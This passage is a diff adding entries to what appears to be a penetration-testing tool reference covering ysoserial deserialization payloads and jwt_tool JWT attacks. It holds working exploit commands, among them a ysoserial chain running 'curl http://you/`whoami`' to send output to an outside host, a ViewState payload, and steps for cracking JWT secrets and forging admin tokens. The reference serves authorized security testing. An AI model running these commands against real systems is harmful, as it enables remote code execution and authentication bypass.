+            type: "commands",
+            commands: [
+              { label: "Confirm deserialization safely (no RCE)", cmd: "# URLDNS just does a DNS lookup — safe confirmation\njava -jar ysoserial.jar URLDNS \"http://<your-collab>.oastify.com\" | base64 -w0\n# paste into the serialized param; a DNS hit confirms the sink" },
+              { label: "Exploit with the right chain", cmd: "# once a library is known/likely:\njava -jar ysoserial.jar CommonsCollections5 \"curl http://you/`whoami`\" \\\n  | base64 -w0\n# deliver in the cookie/param that is deserialized" },
+              { label: ".NET ViewState", cmd: "ysoserial.exe -p ViewState -g TypeConfuseDelegate \\\n  -c \"cmd /c ping you\" --generator=<gen> --validationkey=<key>" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Confirm with URLDNS first — it triggers only a DNS lookup, proving the sink deserializes without firing code. It is the safe detection step.",
+              "The right gadget chain depends on what libraries are on the target's classpath; CommonsCollections variants are the most common starting point.",
+              "Base64 blobs starting rO0AB (or raw bytes AC ED 00 05) are Java serialized objects — the tell-tale sign of a deserialization sink.",
+              "For .NET use the separate ysoserial.net, especially for ASP.NET __VIEWSTATE when machine keys leak.",
+              "This is critical-severity RCE; exploit only within scope, and use a benign command (DNS/HTTP callback, whoami) as proof."
+            ]
+          }
+        ]
+      },
+      {
+        id: "jwt-tool",
+        name: "jwt_tool",
+        url: "https://github.com/ticarpi/jwt_tool",
+        description: "Tests JSON Web Tokens for signature, algorithm, and claim vulnerabilities.",
+        brief: "jwt_tool analyses and attacks JSON Web Tokens. JWTs are everywhere in modern auth, and they carry a well-known set of implementation pitfalls: accepting the 'none' algorithm, confusing RS256 for HS256 so the public key becomes an HMAC secret, weak signing secrets that crack offline, and unvalidated claims you can tamper with. jwt_tool automates testing for all of these and forging tokens once a weakness is found.\n\nIt bundles the standard JWT attack playbook into one tool, so you can go from a captured token to a forged admin token quickly when the implementation is weak.",
+        quickReference: [
+          { label: "Decode and inspect a token", cmd: "jwt_tool <token>" },
+          { label: "Run all known attacks (playbook)", cmd: "jwt_tool <token> -M at -t https://target.com/api -rc \"Authorization: Bearer <token>\"" },
+          { label: "Crack the HMAC secret", cmd: "jwt_tool <token> -C -d wordlist.txt" },
+          { label: "Tamper claims and re-sign", cmd: "jwt_tool <token> -T -S hs256 -k secret.txt" }
+        ],
+        sections: [
+          {
+            title: "Classic JWT Attacks",
+            type: "table",
+            columns: ["Attack", "Description"],
+            rows: [
+              ["alg: none", "Strip the signature and set alg to 'none'/'None' — some libraries accept an unsigned token"],
+              ["Key confusion (RS256->HS256)", "Sign with HS256 using the public key as the HMAC secret; a server expecting RS256 that verifies with HS256 accepts it"],
+              ["Weak secret crack", "Brute/dictionary the HMAC signing secret offline, then forge any token"],
+              ["Claim tampering", "Modify claims (role, user, exp) — only exploitable if signature checks are broken/missing"],
+              ["kid injection", "Abuse the 'kid' header for path traversal or SQL injection to control the key"],
+              ["jwks / jku spoofing", "Point key-URL headers at a key you control"]
+            ]
+          },
+          {
+            title: "Modes",
+            type: "table",
+            columns: ["Flag", "Mode"],
+            rows: [
+              ["(default)", "Decode and display header, payload, and signature"],
+              ["-T", "Tamper — interactively edit claims"],
+              ["-C -d <list>", "Crack the HMAC secret against a wordlist"],
+              ["-X <attack>", "Run a specific exploit (a=alg:none, k=key-confusion, etc.)"],
+              ["-M at", "Run all tests against a live endpoint"],
+              ["-S <alg> -k <key>", "Sign with a chosen algorithm and key"],
+              ["-V -pk <file>", "Verify against a public key"]
+            ]
+          },
+          {
+            title: "Live-Target Options",
+            type: "table",
+            columns: ["Flag", "Description"],
+            rows: [
+              ["-t <url>", "Target endpoint to send test tokens to"],
+              ["-rc <header>", "The request header carrying the token (Cookie or Authorization)"],
+              ["-rh <header>", "Additional headers to send"],
+              ["-cv <string>", "The 'canary' response value that indicates a valid/authenticated response"],
+              ["Why it matters", "jwt_tool can auto-detect which forged tokens the server actually accepts"]
+            ]
+          },
+          {
+            title: "Common Workflows",
+            type: "commands",
+            commands: [
+              { label: "Full automated playbook", cmd: "jwt_tool eyJ...token -M at \\\n  -t https://target.com/api/me \\\n  -rc \"Authorization: Bearer eyJ...token\" -cv \"\\\"admin\\\"\"\n# runs alg:none, key confusion, and more against the live endpoint" },
+              { label: "Crack a weak secret then forge", cmd: "jwt_tool eyJ...token -C -d /usr/share/wordlists/rockyou.txt\n# on success, forge an admin token:\njwt_tool eyJ...token -T -S hs256 -p \"<cracked_secret>\"" },
+              { label: "Key confusion with a captured public key", cmd: "jwt_tool eyJ...token -X k -pk public.pem\n# signs with HS256 using the RSA public key as the secret" }
+            ]
+          },
+          {
+            title: "Notes & Tips",
+            type: "notes",
+            items: [
+              "Start by decoding the token and reading the header: the alg value tells you which attacks (none, HS/RS confusion) are even applicable.",
+              "alg:none and key confusion are implementation bugs — many modern libraries fixed them, but plenty of custom code has not.",
+              "A weak HMAC secret is the most common real-world win: crack it offline, then you can forge any claim you like.",
+              "Tampering claims only works if the signature check is broken or bypassed — changing 'role':'admin' means nothing against proper verification.",
+              "The -M at mode against a live endpoint with a canary value is the fastest way to learn which forged tokens the server actually accepts."
+            ]
+          }
+        ]
       }
     ]
   },
